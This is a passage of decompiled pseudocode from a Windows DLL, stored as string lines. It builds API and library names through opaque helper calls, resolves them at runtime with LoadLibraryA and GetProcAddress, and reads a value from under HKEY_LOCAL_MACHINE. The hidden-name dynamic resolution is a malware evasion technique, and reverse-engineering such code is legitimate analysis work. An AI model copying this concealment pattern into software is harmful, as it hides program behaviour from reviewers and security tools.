    "  LPCWCH lpWideCharStr; // [esp+40h] [ebp-954h] BYREF",
    "  __int128 v180; // [esp+44h] [ebp-950h] BYREF",
    "  __int64 v181; // [esp+54h] [ebp-940h]",
    "  void *v182[4]; // [esp+5Ch] [ebp-938h] BYREF",
    "  int v183; // [esp+6Ch] [ebp-928h]",
    "  unsigned int v184; // [esp+70h] [ebp-924h]",
    "  void *v185[4]; // [esp+74h] [ebp-920h] BYREF",
    "  unsigned int v186; // [esp+84h] [ebp-910h]",
    "  unsigned int v187; // [esp+88h] [ebp-90Ch]",
    "  void *v188[4]; // [esp+8Ch] [ebp-908h] BYREF",
    "  int v189; // [esp+9Ch] [ebp-8F8h]",
    "  unsigned int v190; // [esp+A0h] [ebp-8F4h]",
    "  void *v191[4]; // [esp+A4h] [ebp-8F0h] BYREF",
    "  int v192; // [esp+B4h] [ebp-8E0h]",
    "  unsigned int v193; // [esp+B8h] [ebp-8DCh]",
    "  void *v194[4]; // [esp+BCh] [ebp-8D8h] BYREF",
    "  int v195; // [esp+CCh] [ebp-8C8h]",
    "  unsigned int v196; // [esp+D0h] [ebp-8C4h]",
    "  void *Block; // [esp+D4h] [ebp-8C0h] BYREF",
    "  int v198; // [esp+E4h] [ebp-8B0h]",
    "  unsigned int v199; // [esp+E8h] [ebp-8ACh]",
    "  void *v200[4]; // [esp+ECh] [ebp-8A8h] BYREF",
    "  int v201; // [esp+FCh] [ebp-898h]",
    "  unsigned int v202; // [esp+100h] [ebp-894h]",
    "  void *v203[4]; // [esp+104h] [ebp-890h] BYREF",
    "  int v204; // [esp+114h] [ebp-880h]",
    "  unsigned int v205; // [esp+118h] [ebp-87Ch]",
    "  void *v206[4]; // [esp+11Ch] [ebp-878h] BYREF",
    "  int v207; // [esp+12Ch] [ebp-868h]",
    "  unsigned int v208; // [esp+130h] [ebp-864h]",
    "  LPCWSTR lpModuleName[4]; // [esp+134h] [ebp-860h] BYREF",
    "  int v210; // [esp+144h] [ebp-850h]",
    "  unsigned int v211; // [esp+148h] [ebp-84Ch]",
    "  LPCSTR lpProcName[4]; // [esp+14Ch] [ebp-848h] BYREF",
    "  int v213; // [esp+15Ch] [ebp-838h]",
    "  unsigned int v214; // [esp+160h] [ebp-834h]",
    "  LPCSTR lpLibFileName[4]; // [esp+164h] [ebp-830h] BYREF",
    "  int v216; // [esp+174h] [ebp-820h]",
    "  unsigned int v217; // [esp+178h] [ebp-81Ch]",
    "  int v218; // [esp+17Ch] [ebp-818h] BYREF",
    "  void **v219; // [esp+180h] [ebp-814h] BYREF",
    "  unsigned __int16 Src[1024]; // [esp+184h] [ebp-810h] BYREF",
    "  int v221; // [esp+990h] [ebp-4h]",
    "",
    "  v1 = a1;",
    "  lpWideCharStr = a1;",
    "  cchWideChar = (int)a1;",
    "  *(_OWORD *)v185 = 0;",
    "  v186 = 0;",
    "  v187 = 0;",
    "  sub_1000A170(v185, &unk_1003B3C4, 0);",
    "  v221 = 1;",
    "  v180 = 0;",
    "  v181 = 0xF00000000LL;",
    "  LOBYTE(v180) = 0;",
    "  sub_1000A970(v169, v170);",
    "  v178 = sub_10002FE0();",
    "  sub_10009E70(v178 + 1008);",
    "  sub_1000B000(v200, v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "  LOBYTE(v221) = 2;",
    "  sub_10009E70(v200);",
    "  sub_1000AA30((int)v206, (LPCCH)v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "  LOBYTE(v221) = 3;",
    "  v219 = &v163;",
    "  sub_10009E70(v178);",
    "  sub_1000B000(&v163, v91, v103, v115, v127, v139, v151);",
    "  LOBYTE(v221) = 4;",
    "  sub_10009E70(v178 + 744);",
    "  LOBYTE(v221) = 3;",
    "  sub_1000B970((int)v203, v92, v104, v116, v128, v140, v152, v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "  LOBYTE(v221) = 5;",
    "  sub_10009E70(v203);",
    "  sub_1000AA30((int)lpModuleName, (LPCCH)v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "  LOBYTE(v221) = 6;",
    "  v219 = &v163;",
    "  sub_10009E70(v178 + 24);",
    "  sub_1000B000(&v163, v93, v105, v117, v129, v141, v153);",
    "  LOBYTE(v221) = 7;",
    "  sub_10009E70(v178 + 768);",
    "  LOBYTE(v221) = 6;",
    "  sub_1000B970(",
    "    (int)lpProcName,",
    "    v94,",
    "    v106,",
    "    v118,",
    "    v130,",
    "    v142,",
    "    v154,",
    "    v163,",
    "    v164,",
    "    v165,",
    "    (int)v166,",
    "    v167,",
    "    (int)p_lpWideCharStr);",
    "  LOBYTE(v221) = 8;",
    "  v219 = &v163;",
    "  sub_10009E70(v178 + 216);",
    "  sub_1000B000(&v163, v95, v107, v119, v131, v143, v155);",
    "  LOBYTE(v221) = 9;",
    "  sub_10009E70(v178 + 960);",
    "  LOBYTE(v221) = 8;",
    "  sub_1000B970(",
    "    (int)lpLibFileName,",
    "    v96,",
    "    v108,",
    "    v120,",
    "    v132,",
    "    v144,",
    "    v156,",
    "    v163,",
    "    v164,",
    "    v165,",
    "    (int)v166,",
    "    v167,",
    "    (int)p_lpWideCharStr);",
    "  LOBYTE(v221) = 10;",
    "  sub_10009E70(lpLibFileName);",
    "  sub_1000AA30((int)&Block, (LPCCH)v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "  LOBYTE(v221) = 11;",
    "  v2 = (const CHAR *)lpProcName;",
    "  v3 = (const WCHAR *)lpModuleName;",
    "  if ( v214 > 0xF )",
    "    v2 = lpProcName[0];",
    "  p_lpWideCharStr = (LPCWCH *)v2;",
    "  if ( v211 > 7 )",
    "    v3 = lpModuleName[0];",
    "  ModuleHandleW = GetModuleHandleW(v3);",
    "  ProcAddress = GetProcAddress(ModuleHandleW, (LPCSTR)p_lpWideCharStr);",
    "  v5 = (const CHAR *)lpLibFileName;",
    "  if ( v217 > 0xF )",
    "    v5 = lpLibFileName[0];",
    "  LibraryA = LoadLibraryA(v5);",
    "  if ( !LibraryA )",
    "  {",
    "    p_lpWideCharStr = 0;",
    "    *(_OWORD *)a1 = 0;",
    "    v167 = (int)&unk_1003B3A1;",
    "    *((_DWORD *)a1 + 4) = 0;",
    "    *((_DWORD *)a1 + 5) = 0;",
    "    sub_100018C0(a1, (void *)v167, (size_t)p_lpWideCharStr);",
    "    if ( v199 > 7 )",
    "    {",
    "      v6 = Block;",
    "      v7 = (const CHAR *)(2 * v199 + 2);",
    "      if ( (unsigned int)v7 >= 0x1000 )",
    "      {",
    "        v6 = (_BYTE *)*((_DWORD *)Block - 1);",
    "        v7 = (const CHAR *)(2 * v199 + 37);",
    "        if ( (unsigned int)((_BYTE *)Block - v6 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v7;",
    "      sub_100154EB(v6);",
    "    }",
    "    v198 = 0;",
    "    v199 = 7;",
    "    LOWORD(Block) = 0;",
    "    if ( v217 > 0xF )",
    "    {",
    "      v8 = (CHAR *)lpLibFileName[0];",
    "      v9 = (const CHAR *)(v217 + 1);",
    "      if ( v217 + 1 >= 0x1000 )",
    "      {",
    "        v8 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "        v9 = (const CHAR *)(v217 + 36);",
    "        if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v8 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v9;",
    "      sub_100154EB(v8);",
    "    }",
    "    v216 = 0;",
    "    v217 = 15;",
    "    LOBYTE(lpLibFileName[0]) = 0;",
    "    if ( v214 > 0xF )",
    "    {",
    "      v10 = (CHAR *)lpProcName[0];",
    "      v11 = (const CHAR *)(v214 + 1);",
    "      if ( v214 + 1 >= 0x1000 )",
    "      {",
    "        v10 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "        v11 = (const CHAR *)(v214 + 36);",
    "        if ( (unsigned int)(lpProcName[0] - (LPCSTR)v10 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v11;",
    "      sub_100154EB(v10);",
    "    }",
    "    v213 = 0;",
    "    v214 = 15;",
    "    LOBYTE(lpProcName[0]) = 0;",
    "    if ( v211 > 7 )",
    "    {",
    "      v12 = (WCHAR *)lpModuleName[0];",
    "      v13 = (const CHAR *)(2 * v211 + 2);",
    "      if ( (unsigned int)v13 >= 0x1000 )",
    "      {",
    "        v12 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "        v13 = (const CHAR *)(2 * v211 + 37);",
    "        if ( (unsigned int)((char *)lpModuleName[0] - (char *)v12 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v13;",
    "      sub_100154EB(v12);",
    "    }",
    "    v210 = 0;",
    "    v211 = 7;",
    "    LOWORD(lpModuleName[0]) = 0;",
    "    if ( v205 > 0xF )",
    "    {",
    "      v14 = v203[0];",
    "      v15 = (const CHAR *)(v205 + 1);",
    "      if ( v205 + 1 >= 0x1000 )",
    "      {",
    "        v14 = (void *)*((_DWORD *)v203[0] - 1);",
    "        v15 = (const CHAR *)(v205 + 36);",
    "        if ( (unsigned int)((char *)v203[0] - (char *)v14 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v15;",
    "      sub_100154EB(v14);",
    "    }",
    "    v204 = 0;",
    "    v205 = 15;",
    "    LOBYTE(v203[0]) = 0;",
    "    if ( v208 > 7 )",
    "    {",
    "      v16 = v206[0];",
    "      v17 = (const CHAR *)(2 * v208 + 2);",
    "      if ( (unsigned int)v17 >= 0x1000 )",
    "      {",
    "        v16 = (void *)*((_DWORD *)v206[0] - 1);",
    "        v17 = (const CHAR *)(2 * v208 + 37);",
    "        if ( (unsigned int)((char *)v206[0] - (char *)v16 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v17;",
    "      sub_100154EB(v16);",
    "    }",
    "    v207 = 0;",
    "    v208 = 7;",
    "    LOWORD(v206[0]) = 0;",
    "    if ( v202 > 0xF )",
    "    {",
    "      v18 = v200[0];",
    "      v19 = (const CHAR *)(v202 + 1);",
    "      if ( v202 + 1 >= 0x1000 )",
    "      {",
    "        v18 = (void *)*((_DWORD *)v200[0] - 1);",
    "        v19 = (const CHAR *)(v202 + 36);",
    "        if ( (unsigned int)((char *)v200[0] - (char *)v18 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "LABEL_35:",
    "      p_lpWideCharStr = (LPCWCH *)v19;",
    "      sub_100154EB(v18);",
    "      goto LABEL_36;",
    "    }",
    "    goto LABEL_36;",
    "  }",
    "  v219 = &v163;",
    "  sub_10009E70(v178 + 264);",
    "  sub_1000B000(&v163, v97, v109, v121, v133, v145, v157);",
    "  LOBYTE(v221) = 12;",
    "  sub_10009E70(v178 + 1032);",
    "  LOBYTE(v221) = 11;",
    "  sub_1000B970((int)v194, v98, v110, v122, v134, v146, v158, v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "  LOBYTE(v221) = 13;",
    "  v22 = v194;",
    "  if ( v196 > 0xF )",
    "    v22 = (void **)v194[0];",
    "  v23 = (int (__stdcall *)(int, void **, _DWORD, int, LPCWCH *))((int (__stdcall *)(HMODULE, void **))ProcAddress)(",
    "                                                                  LibraryA,",
    "                                                                  v22);",
    "  if ( !v23 )",
    "  {",
    "    p_lpWideCharStr = 0;",
    "    *(_OWORD *)a1 = 0;",
    "    v167 = (int)&unk_1003B3A1;",
    "    *((_DWORD *)a1 + 4) = 0;",
    "    *((_DWORD *)a1 + 5) = 0;",
    "    sub_100018C0(a1, (void *)v167, (size_t)p_lpWideCharStr);",
    "    if ( v196 > 0xF )",
    "    {",
    "      v77 = v194[0];",
    "      v78 = (const CHAR *)(v196 + 1);",
    "      if ( v196 + 1 >= 0x1000 )",
    "      {",
    "        v77 = (void *)*((_DWORD *)v194[0] - 1);",
    "        v78 = (const CHAR *)(v196 + 36);",
    "        if ( (unsigned int)((char *)v194[0] - (char *)v77 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v78;",
    "      sub_100154EB(v77);",
    "    }",
    "    v195 = 0;",
    "    v196 = 15;",
    "    LOBYTE(v194[0]) = 0;",
    "    if ( v199 > 7 )",
    "    {",
    "      v79 = Block;",
    "      v80 = (const CHAR *)(2 * v199 + 2);",
    "      if ( (unsigned int)v80 >= 0x1000 )",
    "      {",
    "        v79 = (_BYTE *)*((_DWORD *)Block - 1);",
    "        v80 = (const CHAR *)(2 * v199 + 37);",
    "        if ( (unsigned int)((_BYTE *)Block - v79 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v80;",
    "      sub_100154EB(v79);",
    "    }",
    "    v198 = 0;",
    "    v199 = 7;",
    "    LOWORD(Block) = 0;",
    "    if ( v217 > 0xF )",
    "    {",
    "      v81 = (CHAR *)lpLibFileName[0];",
    "      v82 = (const CHAR *)(v217 + 1);",
    "      if ( v217 + 1 >= 0x1000 )",
    "      {",
    "        v81 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "        v82 = (const CHAR *)(v217 + 36);",
    "        if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v81 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v82;",
    "      sub_100154EB(v81);",
    "    }",
    "    v216 = 0;",
    "    v217 = 15;",
    "    LOBYTE(lpLibFileName[0]) = 0;",
    "    if ( v214 > 0xF )",
    "    {",
    "      v83 = (CHAR *)lpProcName[0];",
    "      v84 = (const CHAR *)(v214 + 1);",
    "      if ( v214 + 1 >= 0x1000 )",
    "      {",
    "        v83 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "        v84 = (const CHAR *)(v214 + 36);",
    "        if ( (unsigned int)(lpProcName[0] - (LPCSTR)v83 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v84;",
    "      sub_100154EB(v83);",
    "    }",
    "    v213 = 0;",
    "    v214 = 15;",
    "    LOBYTE(lpProcName[0]) = 0;",
    "    if ( v211 > 7 )",
    "    {",
    "      v85 = (WCHAR *)lpModuleName[0];",
    "      v86 = (const CHAR *)(2 * v211 + 2);",
    "      if ( (unsigned int)v86 >= 0x1000 )",
    "      {",
    "        v85 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "        v86 = (const CHAR *)(2 * v211 + 37);",
    "        if ( (unsigned int)((char *)lpModuleName[0] - (char *)v85 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v86;",
    "      sub_100154EB(v85);",
    "    }",
    "    v210 = 0;",
    "    v211 = 7;",
    "    LOWORD(lpModuleName[0]) = 0;",
    "    if ( v205 > 0xF )",
    "    {",
    "      v87 = v203[0];",
    "      v88 = (const CHAR *)(v205 + 1);",
    "      if ( v205 + 1 >= 0x1000 )",
    "      {",
    "        v87 = (void *)*((_DWORD *)v203[0] - 1);",
    "        v88 = (const CHAR *)(v205 + 36);",
    "        if ( (unsigned int)((char *)v203[0] - (char *)v87 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v88;",
    "      sub_100154EB(v87);",
    "    }",
    "    v204 = 0;",
    "    v205 = 15;",
    "    LOBYTE(v203[0]) = 0;",
    "    if ( v208 > 7 )",
    "    {",
    "      v89 = v206[0];",
    "      v90 = (const CHAR *)(2 * v208 + 2);",
    "      if ( (unsigned int)v90 >= 0x1000 )",
    "      {",
    "        v89 = (void *)*((_DWORD *)v206[0] - 1);",
    "        v90 = (const CHAR *)(2 * v208 + 37);",
    "        if ( (unsigned int)((char *)v206[0] - (char *)v89 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v90;",
    "      sub_100154EB(v89);",
    "    }",
    "    v207 = 0;",
    "    v208 = 7;",
    "    LOWORD(v206[0]) = 0;",
    "    if ( v202 > 0xF )",
    "    {",
    "      v18 = v200[0];",
    "      v19 = (const CHAR *)(v202 + 1);",
    "      if ( v202 + 1 >= 0x1000 )",
    "      {",
    "        v18 = (void *)*((_DWORD *)v200[0] - 1);",
    "        v19 = (const CHAR *)(v202 + 36);",
    "        if ( (unsigned int)((char *)v200[0] - (char *)v18 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      goto LABEL_35;",
    "    }",
    "    goto LABEL_36;",
    "  }",
    "  p_lpWideCharStr = &lpWideCharStr;",
    "  v167 = 1;",
    "  v24 = v206;",
    "  if ( v208 > 7 )",
    "    v24 = (void **)v206[0];",
    "  if ( v23(-2147483646, v24, 0, v167, p_lpWideCharStr) )",
    "  {",
    "    p_lpWideCharStr = 0;",
    "    *(_OWORD *)a1 = 0;",
    "    v167 = (int)&unk_1003B3A1;",
    "    *((_DWORD *)a1 + 4) = 0;",
    "    *((_DWORD *)a1 + 5) = 0;",
    "    sub_100018C0(a1, (void *)v167, (size_t)p_lpWideCharStr);",
    "  }",
    "  else",
    "  {",
    "    memset(Src, 0, sizeof(Src));",
    "    v173 = &v163;",
    "    v218 = 512;",
    "    sub_10009E70(v178 + 336);",
    "    sub_1000B000(&v163, v99, v111, v123, v135, v147, v159);",
    "    LOBYTE(v221) = 14;",
    "    sub_10009E70(v178 + 1104);",
    "    LOBYTE(v221) = 13;",
    "    sub_1000B970((int)v182, v100, v112, v124, v136, v148, v160, v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "    LOBYTE(v221) = 15;",
    "    sub_10009E70(v182);",
    "    sub_1000AA30((int)v188, (LPCCH)v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "    LOBYTE(v221) = 16;",
    "    v176 = &v163;",
    "    sub_10009E70(v178 + 288);",
    "    sub_1000B000(&v163, v101, v113, v125, v137, v149, v161);",
    "    LOBYTE(v221) = 17;",
    "    sub_10009E70(v178 + 1056);",
    "    LOBYTE(v221) = 16;",
    "    sub_1000B970((int)v191, v102, v114, v126, v138, v150, v162, v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "    LOBYTE(v221) = 18;",
    "    v25 = v191;",
    "    if ( v193 > 0xF )",
    "      v25 = (void **)v191[0];",
    "    v26 = (int (__stdcall *)(LPCWCH, void **, _DWORD, void ***, int, LPCWCH *))((int (__stdcall *)(HMODULE, void **))ProcAddress)(",
    "                                                                                 LibraryA,",
    "                                                                                 v25);",
    "    if ( !v26 )",
    "    {",
    "      p_lpWideCharStr = 0;",
    "      *(_OWORD *)a1 = 0;",
    "      v167 = (int)&unk_1003B3A1;",
    "      *((_DWORD *)a1 + 4) = 0;",
    "      *((_DWORD *)a1 + 5) = 0;",
    "      sub_100018C0(a1, (void *)v167, (size_t)p_lpWideCharStr);",
    "      if ( v193 > 0xF )",
    "      {",
    "        v57 = v191[0];",
    "        v58 = (const CHAR *)(v193 + 1);",
    "        if ( v193 + 1 >= 0x1000 )",
    "        {",
    "          v57 = (void *)*((_DWORD *)v191[0] - 1);",
    "          v58 = (const CHAR *)(v193 + 36);",
    "          if ( (unsigned int)((char *)v191[0] - (char *)v57 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v58;",
    "        sub_100154EB(v57);",
    "      }",
    "      v192 = 0;",
    "      v193 = 15;",
    "      LOBYTE(v191[0]) = 0;",
    "      if ( v190 > 7 )",
    "      {",
    "        v59 = v188[0];",
    "        v60 = (const CHAR *)(2 * v190 + 2);",
    "        if ( (unsigned int)v60 >= 0x1000 )",
    "        {",
    "          v59 = (void *)*((_DWORD *)v188[0] - 1);",
    "          v60 = (const CHAR *)(2 * v190 + 37);",
    "          if ( (unsigned int)((char *)v188[0] - (char *)v59 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v60;",
    "        sub_100154EB(v59);",
    "      }",
    "      v189 = 0;",
    "      v190 = 7;",
    "      LOWORD(v188[0]) = 0;",
    "      if ( v184 > 0xF )",
    "      {",
    "        v61 = v182[0];",
    "        v62 = (const CHAR *)(v184 + 1);",
    "        if ( v184 + 1 >= 0x1000 )",
    "        {",
    "          v61 = (void *)*((_DWORD *)v182[0] - 1);",
    "          v62 = (const CHAR *)(v184 + 36);",
    "          if ( (unsigned int)((char *)v182[0] - (char *)v61 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v62;",
    "        sub_100154EB(v61);",
    "      }",
    "      v183 = 0;",
    "      v184 = 15;",
    "      LOBYTE(v182[0]) = 0;",
    "      if ( v196 > 0xF )",
    "      {",
    "        v63 = v194[0];",
    "        v64 = (const CHAR *)(v196 + 1);",
    "        if ( v196 + 1 >= 0x1000 )",
    "        {",
    "          v63 = (void *)*((_DWORD *)v194[0] - 1);",
    "          v64 = (const CHAR *)(v196 + 36);",
    "          if ( (unsigned int)((char *)v194[0] - (char *)v63 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v64;",
    "        sub_100154EB(v63);",
    "      }",
    "      v195 = 0;",
    "      v196 = 15;",
    "      LOBYTE(v194[0]) = 0;",
    "      if ( v199 > 7 )",
    "      {",
    "        v65 = Block;",
    "        v66 = (const CHAR *)(2 * v199 + 2);",
    "        if ( (unsigned int)v66 >= 0x1000 )",
    "        {",
    "          v65 = (_BYTE *)*((_DWORD *)Block - 1);",
    "          v66 = (const CHAR *)(2 * v199 + 37);",
    "          if ( (unsigned int)((_BYTE *)Block - v65 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v66;",
    "        sub_100154EB(v65);",
    "      }",
    "      v198 = 0;",
    "      v199 = 7;",
    "      LOWORD(Block) = 0;",
    "      if ( v217 > 0xF )",
    "      {",
    "        v67 = (CHAR *)lpLibFileName[0];",
    "        v68 = (const CHAR *)(v217 + 1);",
    "        if ( v217 + 1 >= 0x1000 )",
    "        {",
    "          v67 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "          v68 = (const CHAR *)(v217 + 36);",
    "          if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v67 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v68;",
    "        sub_100154EB(v67);",
    "      }",
    "      v216 = 0;",
    "      v217 = 15;",
    "      LOBYTE(lpLibFileName[0]) = 0;",
    "      if ( v214 > 0xF )",
    "      {",
    "        v69 = (CHAR *)lpProcName[0];",
    "        v70 = (const CHAR *)(v214 + 1);",
    "        if ( v214 + 1 >= 0x1000 )",
    "        {",
    "          v69 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "          v70 = (const CHAR *)(v214 + 36);",
    "          if ( (unsigned int)(lpProcName[0] - (LPCSTR)v69 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v70;",
    "        sub_100154EB(v69);",
    "      }",
    "      v213 = 0;",
    "      v214 = 15;",
    "      LOBYTE(lpProcName[0]) = 0;",
    "      if ( v211 > 7 )",
    "      {",
    "        v71 = (WCHAR *)lpModuleName[0];",
    "        v72 = (const CHAR *)(2 * v211 + 2);",
    "        if ( (unsigned int)v72 >= 0x1000 )",
    "        {",
    "          v71 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "          v72 = (const CHAR *)(2 * v211 + 37);",
    "          if ( (unsigned int)((char *)lpModuleName[0] - (char *)v71 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v72;",
    "        sub_100154EB(v71);",
    "      }",
    "      v210 = 0;",
    "      v211 = 7;",
    "      LOWORD(lpModuleName[0]) = 0;",
    "      if ( v205 > 0xF )",
    "      {",
    "        v73 = v203[0];",
    "        v74 = (const CHAR *)(v205 + 1);",
    "        if ( v205 + 1 >= 0x1000 )",
    "        {",
    "          v73 = (void *)*((_DWORD *)v203[0] - 1);",
    "          v74 = (const CHAR *)(v205 + 36);",
    "          if ( (unsigned int)((char *)v203[0] - (char *)v73 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v74;",
    "        sub_100154EB(v73);",
    "      }",
    "      v204 = 0;",
    "      v205 = 15;",
    "      LOBYTE(v203[0]) = 0;",
    "      if ( v208 > 7 )",
    "      {",
    "        v75 = v206[0];",
    "        v76 = (const CHAR *)(2 * v208 + 2);",
    "        if ( (unsigned int)v76 >= 0x1000 )",
    "        {",
    "          v75 = (void *)*((_DWORD *)v206[0] - 1);",
    "          v76 = (const CHAR *)(2 * v208 + 37);",
    "          if ( (unsigned int)((char *)v206[0] - (char *)v75 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v76;",
    "        sub_100154EB(v75);",
    "      }",
    "      v207 = 0;",
    "      v208 = 7;",
    "      LOWORD(v206[0]) = 0;",
    "      if ( v202 > 0xF )",
    "      {",
    "        v18 = v200[0];",
    "        v19 = (const CHAR *)(v202 + 1);",
    "        if ( v202 + 1 >= 0x1000 )",
    "        {",
    "          v18 = (void *)*((_DWORD *)v200[0] - 1);",
    "          v19 = (const CHAR *)(v202 + 36);",
    "          if ( (unsigned int)((char *)v200[0] - (char *)v18 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        goto LABEL_35;",
    "      }",
    "LABEL_36:",
    "      v201 = 0;",
    "      v202 = 15;",
    "      LOBYTE(v200[0]) = 0;",
    "      if ( v187 > 7 )",
    "      {",
    "        v20 = v185[0];",
    "        v21 = (const CHAR *)(2 * v187 + 2);",
    "        if ( (unsigned int)v21 < 0x1000",
    "          || (v20 = (void *)*((_DWORD *)v185[0] - 1),",
    "              v21 = (const CHAR *)(2 * v187 + 37),",
    "              (unsigned int)((char *)v185[0] - (char *)v20 - 4) <= 0x1F) )",
    "        {",
    "LABEL_111:",
    "          p_lpWideCharStr = (LPCWCH *)v21;",
    "          sub_100154EB(v20);",
    "          return v1;",
    "        }",
    "LABEL_190:",
    "        _invalid_parameter_noinfo_noreturn();",
    "      }",
    "      return v1;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)&v218;",
    "    v167 = (int)Src;",
    "    v166 = &v219;",
    "    v27 = v188;",
    "    if ( v190 > 7 )",
    "      v27 = (void **)v188[0];",
    "    if ( v26(lpWideCharStr, v27, 0, v166, v167, p_lpWideCharStr) || v219 != (void **)1 )",
    "    {",
    "      *(_OWORD *)a1 = 0;",
    "      p_lpWideCharStr = 0;",
    "      *((_DWORD *)a1 + 4) = 0;",
    "      v167 = (int)&unk_1003B3A1;",
    "      *((_DWORD *)a1 + 5) = 0;",
    "      sub_100018C0(a1, (void *)v167, (size_t)p_lpWideCharStr);",
    "    }",
    "    else",
    "    {",
    "      v28 = wcslen(Src);",
    "      if ( v28 > v187 )",
    "      {",
    "        LOBYTE(cchWideChar) = 0;",
    "        sub_1000A3C0(v28, cchWideChar, Src);",
    "      }",
    "      else",
    "      {",
    "        v186 = v28;",
    "        p_lpWideCharStr = (LPCWCH *)(2 * v28);",
    "        v29 = v185;",
    "        if ( v187 > 7 )",
    "          v29 = (void **)v185[0];",
    "        memmove(v29, Src, (size_t)p_lpWideCharStr);",
    "        *((_WORD *)v29 + v28) = 0;",
    "        v1 = (WCHAR *)cchWideChar;",
    "      }",
    "      sub_10009D70(v185);",
    "      v30 = (_QWORD *)sub_1000AD50((int)&v171, (LPCWCH)v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "      sub_100034A0(&v180, v30);",
    "      if ( v172 > 0xF )",
    "      {",
    "        v31 = v171;",
    "        v32 = (const CHAR *)(v172 + 1);",
    "        if ( v172 + 1 >= 0x1000 )",
    "        {",
    "          v31 = (_BYTE *)*((_DWORD *)v171 - 1);",
    "          v32 = (const CHAR *)(v172 + 36);",
    "          if ( (unsigned int)((_BYTE *)v171 - v31 - 4) > 0x1F )",
    "            _invalid_parameter_noinfo_noreturn();",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v32;",
    "        sub_100154EB(v31);",
    "      }",
    "      *(_OWORD *)v1 = 0;",
    "      *((_DWORD *)v1 + 4) = 0;",
    "      v33 = v180;",
    "      *((_DWORD *)v1 + 5) = 0;",
    "      *(_OWORD *)v1 = v33;",
    "      *((_QWORD *)v1 + 2) = v181;",
    "    }",
    "    if ( v193 > 0xF )",
    "    {",
    "      v34 = v191[0];",
    "      v35 = (const CHAR *)(v193 + 1);",
    "      if ( v193 + 1 >= 0x1000 )",
    "      {",
    "        v34 = (void *)*((_DWORD *)v191[0] - 1);",
    "        v35 = (const CHAR *)(v193 + 36);",
    "        if ( (unsigned int)((char *)v191[0] - (char *)v34 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v35;",
    "      sub_100154EB(v34);",
    "    }",
    "    LOBYTE(v191[0]) = 0;",
    "    v193 = 15;",
    "    v192 = 0;",
    "    if ( v190 > 7 )",
    "    {",
    "      v36 = v188[0];",
    "      v37 = (const CHAR *)(2 * v190 + 2);",
    "      if ( (unsigned int)v37 >= 0x1000 )",
    "      {",
